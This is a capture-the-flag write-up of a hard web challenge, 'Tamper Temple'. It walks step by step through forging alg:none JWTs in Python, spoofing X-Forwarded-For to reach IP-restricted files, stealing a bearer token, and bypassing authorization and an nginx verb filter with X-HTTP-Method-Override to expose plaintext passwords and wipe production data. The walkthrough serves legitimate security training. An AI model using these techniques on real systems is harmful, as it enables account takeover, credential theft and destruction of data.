---
title: Tamper Temple @ Webverse
date: 2026-06-01 12:00:00 +0100
categories: [Webverse, CTF]
tags: [web, JWT, BFLA, broken-function-level-authorization, alg-none, http-method-override, ip-spoofing, api]
math: false
mermaid: false
media_subpath: /assets/posts/2026-06-01-webverse-tamper-temple
image:
  path: preview.png
---

Tamper Temple is a hard difficulty web challenge on the [Webverse](https://dashboard.webverselabs-pro.com/events/tamper-temple) platform. The scenario: Temple Trust has bolted a freshly hardened portal on top of a v1 API nobody ever dared retire, while an outgoing developer — `developerDave` — plans to wipe the production ledger on his way out. You're handed a guest account (`bob`) and told to become admin before the data disappears.

The intended path chains five separate weaknesses: a debug-info 404, JWT `alg:none` impersonation, IP header spoofing, an insider note that hands over the attack blueprint, and finally a Broken Function Level Authorization (BFLA) bypass on the legacy v1 audit endpoint to steal the admin password and nuke production with a method-override DELETE.

## Recon

The landing page hints straight at the theme — *"Bend the Verb. Breach the Temple."* — and a robots.txt entry that leaks `/dev/`.

![Homepage](homepage.png)
_Challenge home page — BFLA and verb abuse are the explicit theme_

Logging in with the given credentials `bob / temple123` returns a JWT in both the response body and the `session` cookie:

![Login page](login.png)

```bash
curl -s -X POST https://[target]/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=bob&password=temple123"
```

```json
{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYm9iIn0.<sig>",
 "user": "bob"}
```

The token only carries a `user` claim — role is resolved server-side:

![JWT decode](jwt-decode.png)

The `/api/` page documents the surface area. Two endpoints are marked **admin only**: `GET /api/v2/audit` and `GET DELETE /api/v2/production`. A deprecated `v1` block at the bottom is still live.

![API reference](api-ref.png)
_The v1 shrine — scheduled for decommission, never sealed_


## Stage 1 — 404 debug trace leaks JWT algorithm config

Probing a non-existent path returns a rendered debug traceback in production — the 404 page was built for staging and never toggled off:

![404 debug leak](404-leak.png)

The critical lines inside the debug panel:

```python
# algorithms=['HS256', 'none']  <-- legacy clients still send alg:none
SessionLookupError: no active session for user='alice'
  known_web_users=['bob', 'alice']
```

Two things fall out immediately:
- The web JWT verifier accepts `alg:none` — tokens with no signature are valid.
- There is a second web user: **alice**.

With that, visiting `/dev/` as bob shows only `notes.txt` and a `bob · user` badge:

![/dev/ as bob](dev-bob.png)


## Stage 2 — Forge a none-alg JWT as alice → staff role

Bob's role is `user` (guest). The 404 page named `alice` and the badge system on `/dev/` shows roles. Forging a JWT for alice with `alg:none` takes ten lines of Python:

![Forge alice JWT](forge-alice-jwt.png)

```python
import base64, json

def b64url(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

h = b64url(json.dumps({'alg':'none','typ':'JWT'}, separators=(',',':')))
p = b64url(json.dumps({'user':'alice'},           separators=(',',':')))
print(f'{h}.{p}.')   # trailing dot = empty signature
```

Setting that token as the `session` cookie, `/dev/` now shows **alice · staff**:

![/dev/ as alice — staff role](dev-alice.png)
_alice · staff unlocked via alg:none forgery_


## Stage 3 — /dev/notes.txt and IP-restricted files

The `/dev/` index also lists `notes.txt`. Reading it as bob (or alice) reveals three open TODOs:

![dev/notes.txt](dev-notes.png)

```
DEV TODO (MUST FIX IN THIS ORDER !!!)
- 404 error leaks internal username + our legacy token settings.
  FIX THIS (Pentest report said this is CRITICAL)
- The girl mentioned in the 404 error said she was able to get to /logs somehow???
- dave_token.txt is locked down to the developer workstation IP only.
  Does this need fixing?
```

All three bullet points are exploitable in order. The `/logs` endpoint is **staff-only** (alice qualifies) but also requires the request to come from an internal IP. Setting `X-Forwarded-For: 127.0.0.1` satisfies the proxy check:

![/logs — dev IP leak](logs-devip.png)

```bash
curl -s -H "Cookie: session=<alice-none-jwt>" \
     -H "X-Forwarded-For: 127.0.0.1" \
     https://[target]/logs
```

```
[infra] proxy up
[infra] reminder: the dev IP is 10.13.37.42 and is the only IP
        that can be used to reach /dev
[infra] nightly backup ok
```

The developer workstation IP is **10.13.37.42**. Using that in the same header unlocks `dave_token.txt`:

![dave_token.txt](dave-token.png)

```bash
curl -s -H "Cookie: session=<alice-none-jwt>" \
     -H "X-Forwarded-For: 10.13.37.42" \
     https://[target]/dev/dave_token.txt
```

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
  .eyJzdWIiOiJkZXZlbG9wZXJEYXZlIiwicm9sZSI6ImRldmVsb3BlciJ9.<sig>
```

Decoded payload: `{"sub": "developerDave", "role": "developer"}` — a valid HS256-signed API bearer token.


## Stage 4 — developerDave's private note hands over the chain

Calling `/api/v2/me` with Dave's token returns an undocumented `private_notes` field that reads like a villain monologue:

![Dave private notes](dave-private-notes.png)

```bash
curl -s -H "Authorization: Bearer <dave-token>" \
     https://[target]/api/v2/me
```

```json
{
  "sub": "developerDave",
  "role": "developer",
  "private_notes": "I'm leaving the company soon, so I'm going to cause some
    damage before I go. The team has a vuln they can't patch: the API still
    honors X-HTTP-Method-Override, and the old /api/v1/ service was never
    retired. I just need to figure out how the admin's password is being sent.
    Production data lives behind /api/v2/production."
}
```

Two attack primitives confirmed:
1. `X-HTTP-Method-Override` is honoured by the edge.
2. The `/api/v1/` service is still live and may have weaker access controls.


## Stage 5 — BFLA on /api/v1/audit → admin credentials

The v1 audit endpoint returns `403 admin only` on a plain `GET`. The API docs say both v1 and v2 audit are admin-gated. But the BFLA is in the **handler dispatch**: the `GET` handler checks role, the `POST` handler does not. Sending a `GET` with `X-HTTP-Method-Override: POST` makes the server route the request to the unprotected POST handler while still sending a GET over the wire — developer Dave's promised bypass:

![BFLA on /api/v1/audit](bfla-audit.png)

```bash
curl -s -X GET \
     -H "Authorization: Bearer <dave-token>" \
     -H "X-HTTP-Method-Override: POST" \
     https://[target]/api/v1/audit
```

The response is the full plaintext authentication log — every login attempt, every user, every password in the clear:

```json
{"audit": [
  "[10:13:24] AUTH user=admin pass=<REDACTED> via=/api/v1/login",
  "[10:13:44] AUTH user=admin pass=<REDACTED> via=/api/v1/login",
  ...
  "[10:16:43] AUTH user=bob  pass=<REDACTED> via=/api/v1/login",
  ...
]}
```

The admin's plaintext password is right there, repeated on every line.


## Stage 6 — Login as admin and wipe production

With the admin credentials, a straight login against v2 returns a valid HS256 admin JWT:

```bash
curl -s -X POST https://[target]/api/v2/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"<REDACTED>"}'
```

```json
{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<admin-payload>.<sig>"}
```

`/api/v2/production` is documented as `GET DELETE` — but nginx strips raw `DELETE` requests before they reach the app. Back to method override:

![Flag in response header](flag.png)

```bash
curl -si -X POST \
     -H "Authorization: Bearer <admin-token>" \
     -H "X-HTTP-Method-Override: DELETE" \
     -H "Content-Type: application/json" \
     https://[target]/api/v2/production
```

```
HTTP/2 200
x-temple-flag: WEBVERSE{<REDACTED>}

{"deleted": 3, "status": "production wiped"}
```

The flag is returned in the `x-temple-flag` response header the moment the production ledger is wiped.


## The chain in one paragraph

The 404 page exposes a staging debug trace that reveals the web JWT verifier accepts `alg:none` and names a second user `alice`. Forging a no-signature JWT for alice promotes the session to `staff` role, which unlocks `/logs`. That endpoint — reachable by spoofing `X-Forwarded-For: 127.0.0.1` — leaks the developer workstation IP `10.13.37.42`. Spoofing that IP fetches `dave_token.txt`, a valid HS256 bearer token for `developerDave (developer role)`. Calling `/api/v2/me` with that token surfaces a `private_notes` field that announces two vulns: `X-HTTP-Method-Override` is honoured and the v1 API is still live. A BFLA in `/api/v1/audit` — the GET handler enforces admin role, the POST handler does not — is triggered by sending `GET` with `X-HTTP-Method-Override: POST`. The response is the complete plaintext auth log, admin password included. Logging in as admin and issuing `POST /api/v2/production` with `X-HTTP-Method-Override: DELETE` bypasses nginx's verb filter and returns the flag in `x-temple-flag`.

| # | Endpoint | Vulnerability | Outcome |
|---|---|---|---|
| 1 | `GET /nonexistent` | Debug trace in production 404 | JWT `alg:none` config + `alice` username |
| 2 | `session` cookie | JWT `alg:none` accepted | Become `alice · staff` |
| 3 | `GET /logs` | `X-Forwarded-For` IP spoof | Dev workstation IP `10.13.37.42` |
| 4 | `GET /dev/dave_token.txt` | IP spoof `10.13.37.42` | Dave's signed API bearer token |
| 5 | `GET /api/v2/me` | Undocumented `private_notes` field | Attack path blueprint from insider |
| 6 | `GET /api/v1/audit` | BFLA — POST handler skips role check | Admin plaintext password |
| 7 | `POST /api/v2/production` | `X-HTTP-Method-Override: DELETE` | Production wiped, flag in response header |
